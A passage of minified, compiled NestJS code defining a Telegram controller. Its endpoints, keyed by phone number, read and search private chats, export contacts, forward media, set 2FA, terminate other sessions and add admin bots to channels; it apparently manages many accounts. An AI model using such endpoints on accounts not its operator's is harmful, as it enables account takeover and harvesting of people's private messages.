messages"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.ForwardBatchDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.ForwardBatchDto]),s("design:returntype",Promise)],w.prototype,"forwardMessage",null),r([(0,l.Post)("batch-process/:mobile"),(0,p.ApiOperation)({summary:"Process operations in batches"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.BatchProcessDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.BatchProcessDto]),s("design:returntype",Promise)],w.prototype,"processBatchMessages",null),r([(0,l.Get)("messages/search/:mobile"),(0,p.ApiOperation)({summary:"Search messages in a chat"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",required:!0,description:"Chat ID to search in"}),(0,p.ApiQuery)({name:"query",required:!1,description:"Text to search for"}),(0,p.ApiQuery)({name:"types",required:!1,enum:m.MessageType,isArray:!0,description:"Types of messages to include"}),(0,p.ApiQuery)({name:"limit",required:!1,type:Number,description:"Number of messages to fetch"}),(0,p.ApiQuery)({name:"minId",required:!1,type:Number,description:"Minimum message ID"}),(0,p.ApiQuery)({name:"maxId",required:!1,type:Number,description:"Maximum message ID"}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("query")),c(3,(0,l.Query)("types")),c(4,(0,l.Query)("limit")),c(5,(0,l.Query)("minId")),c(6,(0,l.Query)("maxId")),s("design:type",Function),s("design:paramtypes",[String,String,String,Array,Number,Number,Number]),s("design:returntype",Promise)],w.prototype,"searchMessages",null),r([(0,l.Get)("channels/:mobile"),(0,p.ApiOperation)({summary:"Get channel information"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"includeIds",required:!1,type:Boolean}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("includeIds")),s("design:type",Function),s("design:paramtypes",[String,Boolean]),s("design:returntype",Promise)],w.prototype,"getChannelInfo",null),r([(0,l.Post)("forwardMediatoMe/:mobile"),(0,p.ApiOperation)({summary:"Forward media messages to me"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"channel",description:"Channel username or ID",required:!1}),(0,p.ApiQuery)({name:"fromChatId",description:"Source chat ID to forward messages from",required:!1}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("channel")),c(2,(0,l.Query)("fromChatId")),s("design:type",Function),s("design:paramtypes",[String,String,String]),s("design:returntype",Promise)],w.prototype,"forwardMedia",null),r([(0,l.Post)("channels/leave/:mobile"),(0,p.ApiOperation)({summary:"Leave channel"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"channel",description:"Channel ID/username",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("channel")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"leaveChannel",null),r([(0,l.Post)("2fa/:mobile"),(0,p.ApiOperation)({summary:"Setup two-factor authentication"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"setup2FA",null),r([(0,l.Post)("privacy/:mobile"),(0,p.ApiOperation)({summary:"Update privacy settings"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"updatePrivacy",null),r([(0,l.Post)("privacy/batch/:mobile"),(0,p.ApiOperation)({summary:"Update multiple privacy settings"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.PrivacySettingsDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.PrivacySettingsDto]),s("design:returntype",Promise)],w.prototype,"updatePrivacyBatch",null),r([(0,l.Get)("sessions/:mobile"),(0,p.ApiOperation)({summary:"Get active sessions"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Active sessions retrieved successfully"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getActiveSessions",null),r([(0,l.Delete)("sessions/:mobile"),(0,p.ApiOperation)({summary:"Terminate other sessions"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Other sessions terminated successfully"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"terminateOtherSessions",null),r([(0,l.Post)("sessions/new/:mobile"),(0,p.ApiOperation)({summary:"Create new session"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"New session created successfully"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"createNewSession",null),r([(0,l.Get)("session/info/:mobile"),(0,p.ApiOperation)({summary:"Get session information"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getSessionInfo",null),r([(0,l.Post)("session/terminate/:mobile"),(0,p.ApiOperation)({summary:"Terminate specific session"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"terminateSession",null),r([(0,l.Get)("monitoring/status"),(0,p.ApiOperation)({summary:"Get service health and connection status"}),(0,p.ApiResponse)({status:200,type:y.ConnectionStatusDto}),s("design:type",Function),s("design:paramtypes",[]),s("design:returntype",Promise)],w.prototype,"getConnectionStatus",null),r([(0,l.Get)("monitoring/calllog/:mobile"),(0,p.ApiOperation)({summary:"Get call log statistics"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getCallLogStats",null),r([(0,l.Post)("contacts/add-bulk/:mobile"),(0,p.ApiOperation)({summary:"Add multiple contacts in bulk"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.AddContactsDto}),(0,p.ApiResponse)({status:200,description:"Contacts added successfully"}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.AddContactsDto]),s("design:returntype",Promise)],w.prototype,"addContactsBulk",null),r([(0,l.Get)("contacts/:mobile"),(0,p.ApiOperation)({summary:"Get all contacts"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Contacts retrieved successfully"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getContacts",null),r([(0,l.Post)("media/send/:mobile"),(0,p.ApiOperation)({summary:"Send media message"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.SendMediaDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.SendMediaDto]),s("design:returntype",Promise)],w.prototype,"sendMedia",null),r([(0,l.Get)("media/download/:mobile"),(0,p.ApiOperation)({summary:"Download media from a message"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",required:!0}),(0,p.ApiQuery)({name:"messageId",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("messageId")),c(3,(0,l.Res)()),s("design:type",Function),s("design:paramtypes",[String,String,Number,Object]),s("design:returntype",Promise)],w.prototype,"downloadMedia",null),r([(0,l.Post)("media/album/:mobile"),(0,p.ApiOperation)({summary:"Send media album (multiple photos/videos)"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.SendMediaAlbumDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"sendMediaAlbum",null),r([(0,l.Get)("media/metadata/:mobile"),(0,p.ApiOperation)({summary:"Get media metadata from a chat"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",required:!0}),(0,p.ApiQuery)({name:"types",enum:["photo","video","document"],required:!1,isArray:!0}),(0,p.ApiQuery)({name:"startDate",required:!1}),(0,p.ApiQuery)({name:"endDate",required:!1}),(0,p.ApiQuery)({name:"limit",description:"Number of messages to fetch",required:!1,type:Number}),(0,p.ApiQuery)({name:"minId",required:!1,type:Number}),(0,p.ApiQuery)({name:"maxId",required:!1,type:Number}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("types")),c(3,(0,l.Query)("startDate")),c(4,(0,l.Query)("endDate")),c(5,(0,l.Query)("limit")),c(6,(0,l.Query)("minId")),c(7,(0,l.Query)("maxId")),c(8,(0,l.Query)("all")),s("design:type",Function),s("design:paramtypes",[String,String,Array,String,String,Number,Number,Number,Boolean]),s("design:returntype",Promise)],w.prototype,"getMediaMetadata",null),r([(0,l.Get)("media/filter/:mobile"),(0,p.ApiOperation)({summary:"Get filtered media messages from a chat"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",required:!0,description:"Chat ID to get media from"}),(0,p.ApiQuery)({name:"types",required:!1,enum:["photo","video","document","voice"],isArray:!0}),(0,p.ApiQuery)({name:"startDate",required:!1,description:"Filter media after this date"}),(0,p.ApiQuery)({name:"endDate",required:!1,description:"Filter media before this date"}),(0,p.ApiQuery)({name:"limit",required:!1,type:Number,description:"Number of media items to fetch"}),(0,p.ApiQuery)({name:"minId",required:!1,type:Number,description:"Minimum message ID"}),(0,p.ApiQuery)({name:"maxId",required:!1,type:Number,description:"Maximum message ID"}),(0,p.ApiResponse)({status:200,type:[g.MediaMetadataDto]}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("types")),c(3,(0,l.Query)("startDate")),c(4,(0,l.Query)("endDate")),c(5,(0,l.Query)("limit")),c(6,(0,l.Query)("minId")),c(7,(0,l.Query)("maxId")),s("design:type",Function),s("design:paramtypes",[String,String,Array,String,String,Number,Number,Number]),s("design:returntype",Promise)],w.prototype,"getFilteredMedia",null),r([(0,l.Get)("group/members/:mobile"),(0,p.ApiOperation)({summary:"Get group members"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"groupId",description:"Group ID",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("groupId")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"getGroupMembers",null),r([(0,l.Post)("chat/block/:mobile"),(0,p.ApiOperation)({summary:"Block a chat/user"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",description:"Chat/User ID to block",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"blockChat",null),r([(0,l.Delete)("chat/:mobile"),(0,p.ApiOperation)({summary:"Delete a chat"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",description:"Chat ID to delete",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"deleteChatHistory",null),r([(0,l.Get)("messages/inline/:mobile"),(0,p.ApiOperation)({summary:"Send message with inline button"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",required:!0}),(0,p.ApiQuery)({name:"message",required:!0}),(0,p.ApiQuery)({name:"url",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("message")),c(3,(0,l.Query)("url")),s("design:type",Function),s("design:paramtypes",[String,String,String,String]),s("design:returntype",Promise)],w.prototype,"sendMessageWithInlineButton",null),r([(0,l.Get)("dialogs/:mobile"),(0,p.ApiOperation)({summary:"Get all dialogs"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"limit",required:!1,type:Number,description:"Number of dialogs to fetch",default:500}),(0,p.ApiQuery)({name:"offsetId",required:!1,type:Number,description:"Offset ID for pagination",default:0}),(0,p.ApiQuery)({name:"archived",required:!1,type:Boolean,description:"Include archived chats",default:!1}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("limit")),c(2,(0,l.Query)("offsetId")),c(3,(0,l.Query)("archived")),s("design:type",Function),s("design:paramtypes",[String,Number,Number,Boolean]),s("design:returntype",Promise)],w.prototype,"getAllDialogs",null),r([(0,l.Get)("last-active/:mobile"),(0,p.ApiOperation)({summary:"Get last active time"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Last active time retrieved successfully"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getLastActiveTime",null),r([(0,l.Post)("group/create/:mobile"),(0,p.ApiOperation)({summary:"Create a new group with advanced options"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.createGroupDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.createGroupDto]),s("design:returntype",Promise)],w.prototype,"createGroupWithOptions",null),r([(0,l.Post)("group/settings/:mobile"),(0,p.ApiOperation)({summary:"Update group settings"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.GroupSettingsDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.GroupSettingsDto]),s("design:returntype",Promise)],w.prototype,"updateGroupSettings",null),r([(0,l.Post)("group/members/:mobile"),(0,p.ApiOperation)({summary:"Add members to a group"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.GroupMemberOperationDto}),c(0,(0,l.Body)()),c(1,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[u.GroupMemberOperationDto,String]),s("design:returntype",Promise)],w.prototype,"addGroupMembers",null),r([(0,l.Delete)("group/members/:mobile"),(0,p.ApiOperation)({summary:"Remove members from a group"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.GroupMemberOperationDto}),c(0,(0,l.Body)()),c(1,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[u.GroupMemberOperationDto,String]),s("design:returntype",Promise)],w.prototype,"removeGroupMembers",null),r([(0,l.Post)("group/admin/:mobile"),(0,p.ApiOperation)({summary:"Promote or demote group admins"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.AdminOperationDto}),c(0,(0,l.Body)()),c(1,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[u.AdminOperationDto,String]),s("design:returntype",Promise)],w.prototype,"handleAdminOperation",null),r([(0,l.Post)("chat/cleanup/:mobile"),(0,p.ApiOperation)({summary:"Clean up chat history"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.ChatCleanupDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.ChatCleanupDto]),s("design:returntype",Promise)],w.prototype,"cleanupChat",null),r([(0,l.Get)("chat/statistics/:mobile"),(0,p.ApiOperation)({summary:"Get chat statistics"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",description:"Chat ID",required:!0}),(0,p.ApiQuery)({name:"period",enum:["day","week","month"],description:"Statistics period",required:!1}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("period")),s("design:type",Function),s("design:paramtypes",[String,String,String]),s("design:returntype",Promise)],w.prototype,"getChatStatistics",null),r([(0,l.Post)("messages/schedule/:mobile"),(0,p.ApiOperation)({summary:"Schedule a message"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.ScheduleMessageDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.ScheduleMessageDto]),s("design:returntype",Promise)],w.prototype,"scheduleMessage",null),r([(0,l.Get)("messages/scheduled/:mobile"),(0,p.ApiOperation)({summary:"Get scheduled messages"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",description:"Chat ID",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"getScheduledMessages",null),r([(0,l.Post)("media/voice/:mobile"),(0,p.ApiOperation)({summary:"Send voice message"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"sendVoiceMessage",null),r([(0,l.Post)("media/view-once/:mobile"),(0,p.ApiOperation)({summary:"Send a view once (disappearing) media message"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiConsumes)("multipart/form-data","application/json"),(0,p.ApiBody)({schema:{type:"object",properties:{chatId:{type:"string",description:"Chat ID to send the media to"},sourceType:{type:"string",enum:["path","base64","binary"],description:"Source type of media"},path:{type:"string",description:"path of the media file (when sourceType is Path)"},base64Data:{type:"string",description:"Base64 data (when sourceType is base64)"},binaryData:{type:"string",format:"binary",description:"Binary file (when sourceType is binary)"},caption:{type:"string",description:"Optional caption for the media"},filename:{type:"string",description:"Optional filename for the media"}},required:["chatId","sourceType"]}}),(0,l.UseInterceptors)((0,f.FileInterceptor)("binaryData",{storage:v.memoryStorage()})),(0,p.ApiResponse)({status:200,description:"View once media sent successfully"}),(0,p.ApiResponse)({status:400,description:"Failed to send view once media"}),c(0,(0,l.Param)("mobile")),c(1,(0,l.UploadedFile)()),c(2,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object,u.ViewOnceMediaDto]),s("design:returntype",Promise)],w.prototype,"sendViewOnceMedia",null),r([(0,l.Get)("chat/history/:mobile"),(0,p.ApiOperation)({summary:"Get chat history with metadata"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"chatId",required:!0}),(0,p.ApiQuery)({name:"offset",required:!1,type:Number}),(0,p.ApiQuery)({name:"limit",required:!1,type:Number}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("chatId")),c(2,(0,l.Query)("offset")),c(3,(0,l.Query)("limit")),s("design:type",Function),s("design:paramtypes",[String,String,Number,Number]),s("design:returntype",Promise)],w.prototype,"getChatHistory",null),r([(0,l.Post)("group/admin/promote/:mobile"),(0,p.ApiOperation)({summary:"Promote members to admin"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.AdminOperationDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.AdminOperationDto]),s("design:returntype",Promise)],w.prototype,"promoteToAdmin",null),r([(0,l.Post)("group/admin/demote/:mobile"),(0,p.ApiOperation)({summary:"Demote admin to regular member"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.GroupMemberOperationDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.GroupMemberOperationDto]),s("design:returntype",Promise)],w.prototype,"demoteAdmin",null),r([(0,l.Post)("group/unblock/:mobile"),(0,p.ApiOperation)({summary:"Unblock a user in a group"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"unblockGroupUser",null),r([(0,l.Get)("group/admins/:mobile"),(0,p.ApiOperation)({summary:"Get list of group admins"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"groupId",description:"Group ID",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("groupId")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"getGroupAdmins",null),r([(0,l.Get)("group/banned/:mobile"),(0,p.ApiOperation)({summary:"Get list of banned users in a group"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiQuery)({name:"groupId",description:"Group ID",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("groupId")),s("design:type",Function),s("design:paramtypes",[String,String]),s("design:returntype",Promise)],w.prototype,"getGroupBannedUsers",null),r([(0,l.Post)("contacts/export/:mobile"),(0,p.ApiOperation)({summary:"Export contacts in vCard or CSV format"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.ContactExportImportDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),c(2,(0,l.Res)()),s("design:type",Function),s("design:paramtypes",[String,u.ContactExportImportDto,Object]),s("design:returntype",Promise)],w.prototype,"exportContacts",null),r([(0,l.Post)("contacts/import/:mobile"),(0,p.ApiOperation)({summary:"Import contacts from a list"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Array]),s("design:returntype",Promise)],w.prototype,"importContacts",null),r([(0,l.Post)("contacts/block/:mobile"),(0,p.ApiOperation)({summary:"Manage blocked contacts"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:u.ContactBlockListDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,u.ContactBlockListDto]),s("design:returntype",Promise)],w.prototype,"manageBlockList",null),r([(0,l.Get)("contacts/statistics/:mobile"),(0,p.ApiOperation)({summary:"Get contact activity statistics"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiResponse)({status:200,description:"Contact statistics retrieved successfully"}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getContactStatistics",null),r([(0,l.Post)("folders/create/:mobile"),(0,p.ApiOperation)({summary:"Create a new chat folder"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({type:h.CreateChatFolderDto}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,h.CreateChatFolderDto]),s("design:returntype",Promise)],w.prototype,"createChatFolder",null),r([(0,l.Get)("folders/:mobile"),(0,p.ApiOperation)({summary:"Get all chat folders"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getChatFolders",null),r([(0,l.Put)("messages/:mobile"),(0,p.ApiOperation)({summary:"Edit message"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"editMessage",null),r([(0,l.Post)("chat/settings/:mobile"),(0,p.ApiOperation)({summary:"Update chat settings"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"updateChatSettings",null),r([(0,l.Post)("media/batch/:mobile"),(0,p.ApiOperation)({summary:"Send multiple media files in batch"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"sendMediaBatch",null),r([(0,l.Get)("security/2fa-status/:mobile"),(0,p.ApiOperation)({summary:"Check if 2FA password is set"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"hasPassword",null),r([(0,l.Get)("chats/:mobile"),(0,p.ApiOperation)({summary:"Get chats with advanced filtering"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("limit")),c(2,(0,l.Query)("offsetDate")),c(3,(0,l.Query)("offsetId")),c(4,(0,l.Query)("offsetPeer")),c(5,(0,l.Query)("folderId")),s("design:type",Function),s("design:paramtypes",[String,Number,Number,Number,String,Number]),s("design:returntype",Promise)],w.prototype,"getChats",null),r([(0,l.Get)("file/url/:mobile"),(0,p.ApiOperation)({summary:"Get downloadable URL for a file"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Query)("url")),c(2,(0,l.Query)("filename")),s("design:type",Function),s("design:paramtypes",[String,String,String]),s("design:returntype",Promise)],w.prototype,"getFileUrl",null),r([(0,l.Get)("messages/stats/:mobile"),(0,p.ApiOperation)({summary:"Get message statistics"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"getMessageStats",null),r([(0,l.Get)("chats/top-private/:mobile"),(0,p.ApiOperation)({summary:"Get top 5 private chats with detailed statistics"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),c(0,(0,l.Param)("mobile")),s("design:type",Function),s("design:paramtypes",[String]),s("design:returntype",Promise)],w.prototype,"getTopPrivateChats",null),r([(0,l.Post)("bots/add-to-channel/:mobile"),(0,p.ApiOperation)({summary:"Add bots to channel with admin privileges"}),(0,p.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,p.ApiBody)({schema:{type:"object",properties:{channelIds:{type:"array",items:{type:"string"},description:"Array of channel IDs to add bots to. If not provided, will use default channels from environment variables."}}}}),(0,p.ApiResponse)({status:200,description:"Bots added to channels successfully"}),c(0,(0,l.Param)("mobile")),c(1,(0,l.Body)()),s("design:type",Function),s("design:paramtypes",[String,Object]),s("design:returntype",Promise)],w.prototype,"addBotsToChannel",null),t.TelegramController=w=r([(0,l.Controller)("telegram"),(0,p.ApiTags)("Telegram"),s("design:paramtypes",[d.TelegramService])],w)},282:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramModule=void 0;const o=i(3563),r=i(7330),a=i(2995),s=i(7422),c=i(8421),l=i(3322),p=i(1324),d=i(1273),u=i(2849);let m=class{};t.TelegramModule=m,t.TelegramModule=m=n([(0,o.Module)({imports:[(0,o.forwardRef)((()=>s.UsersModule)),c.BufferClientModule,(0,o.forwardRef)((()=>l.ActiveChannelsModule)),(0,o.forwardRef)((()=>p.ChannelsModule))],controllers:[r.TelegramController],providers:[a.TelegramService,u.TelegramValidationConfig,{provide:"TELEGRAM_LOGGER",useValue:d.TelegramLogger.getInstance()}],exports:[a.TelegramService]})],m)},2995:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),r=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var 